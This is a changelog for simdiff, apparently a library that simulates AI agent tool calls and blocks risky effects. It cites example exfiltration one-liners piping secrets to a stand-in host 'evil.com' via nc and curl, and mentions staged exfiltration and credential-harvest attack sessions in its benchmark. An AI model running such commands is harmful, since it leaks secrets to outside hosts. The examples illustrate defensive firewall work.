# Changelog

## 0.4.0

Cuts the shell adapter's real-world false-positive rate — the honest caveat the
0.3.0 README carried ("on real command streams the shell adapter fail-closes on
most input") is now a measured, CI-enforced number instead of a guess.

- **`ShellAdapter`: broader read-only vocabulary.** Pure inspection/query commands
  (`ls`, `pwd`, `grep`/`egrep`/`fgrep`, `wc`, `ps`, `df`, `du`, `diff`, `which`,
  `stat`, `file`, hash tools, `cd`, `export`, ...) are now recognized as having no
  filesystem effect regardless of arguments, instead of falling into `unknown`.
  `find` is read-only unless it carries a mutating action flag (`-delete`,
  `-exec`, ...); `git` is read-only only for subcommands with no mutating
  invocation form (`status`, `log`, `diff`, `show`, `rev-parse`, `ls-files`, ...) —
  `git branch NAME` / `git checkout --` / `git config key value` etc. still fail
  closed, deliberately, since those *do* have a mutating form. `uniq` is read-only
  only with ≤1 positional argument (a 2nd is an output file).
- **`ShellAdapter`: pipelines.** `a | b | c` is now certified when every stage is
  provably read-only (`cat file | grep foo | wc -l`), with the last stage's output
  redirect still modelled. Any mutating or unrecognized stage — including piping
  into a network tool (`cat secret | nc evil.com 80`) — still fails the whole
  pipeline closed; this is a *strictly* additive relaxation, not a weaker default.
- **New benchmark: `bench/realistic_shell_run.py`.** A 50-command, non-adversarial
  corpus of ordinary agent shell traffic (git, package managers, test runners,
  file inspection), split into commands that should be fully classified
  (inspection, mutation) vs. ones that structurally can't be (opaque — arbitrary
  program effect). Measured result: overall fully-classified rate 24% → 80%;
  pure-inspection commands 10% → 100%; opaque commands correctly stay at 0% for
  both. Compared against a frozen pre-0.4.0 snapshot
  ([`bench/legacy_shell_adapter.py`](bench/legacy_shell_adapter.py)). Asserted in
  [`tests/test_realistic_shell_benchmark.py`](tests/test_realistic_shell_benchmark.py).
- **Expanded multi-step corpus:** `bench/session_corpus.py` grew from 11 to 18
  sessions — three new attack shapes (interleaved credential harvest with slow
  host fan-out, manifest-recon-as-cover, mutation spread across create *and*
  delete) and four new benign workflows (dependency audit, log rotation, code
  review, CI build) that read or mutate many resources for ordinary reasons. The
  cumulative session firewall still catches 100% of attacks at 0% false
  positives on the larger, more diverse corpus.
- **Tests:** 46 new tests (141 → 187), 100% coverage maintained.

## 0.3.0

Session-level firewall — decide over the **accumulated effect** of a tool-call
sequence, not one call at a time.

- **New: `simdiff.session`.** `Session` accumulates each allowed step's effect
  (`CanonicalDelta.merge`) and decides the next step over the running total:
  read-breadth (enumeration), an egress that follows reconnaissance (recon →
  exfil), mass mutation, and egress fanned across hosts. This catches the
  **multi-step** attacks where every individual call is benign — which per-call
  checks and tool-call *pattern* matchers structurally miss. It is effect-based
  (cannot be obfuscated) and fail-closed (the session verdict is never weaker than
  the per-call one). Tunable via `SessionBudget`.
- **New example:** [`examples/session_recon_exfil.py`](examples/session_recon_exfil.py)
  — a staged secret-exfiltration where five benign `cp` reads pass and the sixth
  step (the POST) is blocked by the accumulated effect.
- **Docs:** corrected the competitor list to verified, linkable projects
  (Pipelock, Microsoft Agent Governance Toolkit); removed two names that could not
  be verified.

## 0.2.1

Hardening release after a second, fresh-eyes critical review. No API changes.

- **Repo / packaging:** added `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, GitHub
  issue/PR templates, README badges, and richer PyPI metadata (Python 3.9–3.13
  classifiers, project URLs). Package builds clean and passes `twine check`.
  Removed the redundant `examples/firewall_integration.py` (superseded by
  `examples/guard_tool_call.py`).

- **Tests:** coverage raised to **100%** (statement + branch) and now enforced in
  CI (`--cov-fail-under=100`). This closed previously untested branches, including
  the security-critical solana **owner-reassignment (takeover)** detection, SOL/
  token inflows, null-account RPC responses, and the filesystem fail-closed paths.
- **Security fix (core):** `simdiff()` now turns *any* error escaping an adapter
  (a bug, `MemoryError`, ...) into a fail-closed `unknown` delta instead of letting
  it propagate and crash the caller — the firewall must never lose its verdict to a
  crash. (`KeyboardInterrupt`/`SystemExit` still propagate.)
- **Security fix (sql):** a mutating statement whose target table cannot be
  identified now fails closed instead of being certified against an
  `"<unknown-table>"` placeholder; a tableless `SELECT` (e.g. `SELECT 1`) is
  reported as a harmless read on `"(no table)"`.
- **Fix (cli):** `--existing "a, b"` (whitespace after the comma) is now trimmed,
  so a real delete of `b` is no longer silently dropped.
- **Adoptability:** the CLI now covers `http` (`simdiff http <url> --method …
  --allowed-hosts … --body …`) alongside `shell` and `sql`. Restructured the
  README around how you actually wire simdiff into an agent.
- **New (optional, zero-dep): `simdiff.guard`.** A reference `Guard` that wires
  *simulate → decide* for many tools at once: register a `{tool: builder}` map and
  a `policy`, call `guard.evaluate(tool, args) -> GuardResult(decision, delta)`.
  Fail-closed by construction (unmodeled tool / builder error / adapter crash all
  resolve to `BLOCK`). Ships with a conservative `default_policy` you can replace.
- **New integrations / examples:**
  [`examples/mcp_guard_server.py`](examples/mcp_guard_server.py) — a Model Context
  Protocol server that guards every tool with simdiff before it runs (one-block
  client config); and [`examples/guard_tool_call.py`](examples/guard_tool_call.py)
  — a framework-agnostic guard loop. simdiff's core stays dependency-free; the MCP
  example uses the MCP SDK only when you run it.
- **Tests:** added property-based / fuzz tests (Hypothesis) pinning the safety
  invariants across random inputs: the shell parser is total and never certifies a
  command carrying an unmodelled metachar; sql tolerates arbitrary statements;
  egress to any non-allow-listed host is always surfaced; the filesystem snapshot
  survives arbitrary on-disk states (symlinks, FIFOs, chmod) without raising or
  hanging; and `CanonicalDelta.merge` is a monoid (associative, empty identity).

- **Security fix (filesystem):** snapshotting is no longer crash- or hang-prone.
  An action that created a dangling symlink made `simulate()` raise (instead of
  failing closed), and an action that created a FIFO/special file made the snapshot
  **block forever** on `open()`. Snapshots now use `lstat` (never follow links) and
  only hash regular files; symlinks/FIFOs/sockets/devices are reported as
  `unknown` (fail closed), and any snapshot error fails closed instead of raising.
- **Security fix (shell):** bracket globs (`[...]`) and brace expansion (`{...}`)
  now fail closed like `*`/`?`/`~`. Previously `rm secret[0-9].key` and
  `rm {a,b}.key` slipped through as fully classified with no effect.
- **Security fix (shell):** a redirect *glued* to its target (`cmd>file`,
  `cmd>>file`) is valid bash but could not be tokenised, so it used to vanish
  silently; it now fails closed. Properly spaced `cmd > file` still parses.
- **Security fix (shell):** `cp`/`mv` now account for every source operand
  (`mv a b c dir` no longer drops the deletion of `b` and `c`), and `cp -t DIR` /
  `mv -t DIR` (which copy *into* DIR and would otherwise be misread as a write to
  the last file) fail closed.
- **Fix (http):** the egress allowlist is now compared case-insensitively
  (hostnames are case-insensitive; legit egress to `API.Internal` is no longer
  flagged just because the allowlist case differs).
- **Hardening (sql):** counting a `SELECT` result no longer materialises every
  row in memory (`fetchall()` → streamed count), removing a memory-exhaustion
  vector when simulating a `SELECT *` on a large table.
- **Security fix (solana):** an empty `watch` list now fails closed
  (`"no accounts watched; cannot certify"`) instead of returning an empty,
  fully-classified delta — "inspected nothing" is no longer reported as "safe".
  The RPC is skipped entirely when nothing is watched.
- **Docs (SECURITY.md):** documented that the `shell` adapter trusts `existing` as
  ground truth (a delete of an unlisted path is a no-op), and clarified the
  `solana` `watch` semantics.

## 0.2.0

Hardening release after a critical self-review. **Breaking.**

- **Breaking:** `CanonicalDelta.safe` → `CanonicalDelta.fully_classified` (and the
  JSON key). The old name implied a safety verdict it never made; the new name
  says what it is — "the effect was understood", not "the action is safe".
- **Security fix (shell):** the adapter no longer passes unmodelled constructs
  silently. Pipes, subshells, `$VAR`/`` `cmd` ``/`$( )`, globs, fd redirects,
  backgrounding, unbalanced quotes, and unknown commands now fail closed
  (`unknown`). Previously `cat secrets | curl evil.com` was reported classified
  with no effect.
- **Shell:** paths are normalized (`./prod.db` ≡ `prod.db`) so exact-match
  policies are not bypassed by `./`.
- **HTTP:** the URL path now counts toward egress bytes and the sensitive-marker
  scan (a secret in the path is no longer missed).
- **Solana:** an account is only parsed with the SPL token layout when a token
  program owns it (no more misreading arbitrary ≥165-byte accounts).
- **Docs:** added `SECURITY.md` and a "Security model & limitations" section. The
  README now states plainly that `filesystem`/`sql` **execute** the action (isolate
  untrusted input yourself), that `shell`/`http` interpret rather than simulate,
  and that the benchmark's 0% false-positive figure is corpus-specific.

## 0.1.0

First release.

- `CanonicalDelta` effect model (value moves, authority grants, data access,
  resource use) with fail-closed semantics.
- Adapters: `FilesystemAdapter` (shadow-copy diff with content hashing),
  `SqlAdapter` (savepoint + rollback), `ShellAdapter` (safe interpreter, never
  executes), `HttpAdapter` (egress classification, never sends), `SolanaAdapter`
  (RPC `simulateTransaction` + account diff; the one online adapter, injectable
  RPC, no `solana-py` dependency).
- `simdiff(action, adapter)` top-level API and a demo CLI with fail-closed exit
  codes.
- Adversarial benchmark (`python -m bench.run`) illustrating effect-deciding vs
  keyword/argument scanning. Numbers asserted in CI.
- Zero runtime dependencies, MIT licensed, typed (`py.typed`).
